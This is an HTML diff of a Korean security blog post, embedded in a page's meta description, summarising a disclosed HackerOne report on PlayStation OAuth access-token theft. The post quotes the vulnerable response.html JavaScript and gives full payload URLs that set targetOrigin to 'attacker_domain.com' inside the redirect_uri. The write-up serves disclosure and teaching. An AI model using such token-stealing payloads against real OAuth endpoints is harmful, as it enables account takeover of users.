@@ -20,8 +20,49 @@
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Access token stealing in playstation - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://hackerone.com/reports/821896&#34;&gt;Access token stealing in playstation&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://my.playstation.com&#34;&gt;https://my.playstation.com&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xCF58;&amp;#xC194; &amp;#xAC8C;&amp;#xC784;&amp;#xAE30;&amp;#xAE30;&amp;#xC778; PlayStation&amp;#xC758; &amp;#xCEE4;&amp;#xBBA4;&amp;#xB2C8;&amp;#xD2F0; &lt;a href=&#34;https://my.playstation.com/auth/response.html&#34;&gt;https://my.playstation.com/auth/response.html&lt;/a&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xB41C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; Access Token&amp;#xC744; &amp;#xD0C8;&amp;#xCDE8;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;amp;baseUrl=/&amp;amp;targetOrigin=https://my.playstation.com&#34;&gt;https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;amp;baseUrl=/&amp;amp;targetOrigin=https://my.playstation.com&lt;/a&gt; &amp;#xD398;&amp;#xC774;&amp;#xC9C0;&amp;#xB294; &amp;#xBC1C;&amp;#xAE09; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0;&amp;#xC11C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xB85C; OAuth &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xB294; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xD638;&amp;#xC2A4;&amp;#xD305; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;parseResponse&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;a&lt;/span&gt;) &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; b = a.hash.substr(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;),
+        c = a.search.substr(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;),
+        d = b + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;amp;&amp;quot;&lt;/span&gt; + c,
+        e = convertToObject(d);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; e.refererURL = a.toString(), e
+}
+....
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;sendResponseToApp&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;a&lt;/span&gt;) &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; b = extractFrameTypeFromRequestID(a.requestID),
+        c = a.targetOrigin || getOrigin(),
+        d = a.baseUrl || &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+        e = a.returnRoute || &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+        f = a.excludeQueryParams,
+        g = !f &amp;amp;&amp;amp; &lt;span class=&#34;hljs-built_in&#34;&gt;window&lt;/span&gt;.location.search || &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (b) {
+...
+        &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;window&amp;quot;&lt;/span&gt;:
+            &lt;span class=&#34;hljs-built_in&#34;&gt;window&lt;/span&gt;.opener.postMessage(a, c);
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+...
+    }
+}
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; response = parseResponse(&lt;span class=&#34;hljs-built_in&#34;&gt;window&lt;/span&gt;.location);
+sendResponseToApp(response);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD638;&amp;#xC2A4;&amp;#xD305;&amp;#xB41C; &amp;#xC704; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; access token&amp;#xC744; &amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xC11C;&amp;#xBC84;&amp;#xB85C; &amp;#xC804;&amp;#xC1A1;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;request query&amp;#xB97C; &lt;code&gt;parseResponse()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC2F1; &amp;#xD55C; &amp;#xB4A4;  &lt;code&gt;sendResponseToApp()&lt;/code&gt; &amp;#xC758; &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;query &amp;#xC911; &lt;code&gt;reqeustID&lt;/code&gt; &amp;#xD544;&amp;#xB4DC; &amp;#xAC12;&amp;#xC774; &amp;#x201C;window&amp;#x201D; &amp;#xBA74; &lt;code&gt;window.opener.postMessage()&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;window.opener.postMessage()&lt;/code&gt; &amp;#xB294; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xB97C; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xC778; &amp;#xD2B9;&amp;#xC815; &amp;#xB3C4;&amp;#xBA54;&amp;#xC778;&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xB85C; query&amp;#xC640; &lt;code&gt;targetOrigin&lt;/code&gt; &amp;#xD544;&amp;#xB4DC; &amp;#xAC12;&amp;#xC774; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xBA74; &lt;code&gt;targetOrigin&lt;/code&gt; &amp;#xB3C4;&amp;#xBA54;&amp;#xC778;&amp;#xC73C;&amp;#xB85C; query&amp;#xC5D0; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; Access Token&amp;#xC744; &amp;#xC804;&amp;#xC1A1;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; &amp;#xCD5C;&amp;#xC885; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;https:&lt;span class=&#34;hljs-comment&#34;&gt;//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;amp;baseUrl=/&amp;amp;targetOrigin=https://attacker_domain.com &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; OAuth &amp;#xBC1C;&amp;#xAE09; &amp;#xC11C;&amp;#xBC84; request query&amp;#xC758; &lt;code&gt;redirect_uri&lt;/code&gt; &amp;#xD544;&amp;#xB4DC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF4;&amp;#xB0B4;&amp;#xBA74; Access Token&amp;#xC744; &amp;#xD0C8;&amp;#xCDE8;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;https:&lt;span class=&#34;hljs-comment&#34;&gt;//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;amp;baseUrl=/&amp;amp;targetOrigin=https://attacker_domain.com/&amp;amp;prompt=non&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="/thumbnail.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/">
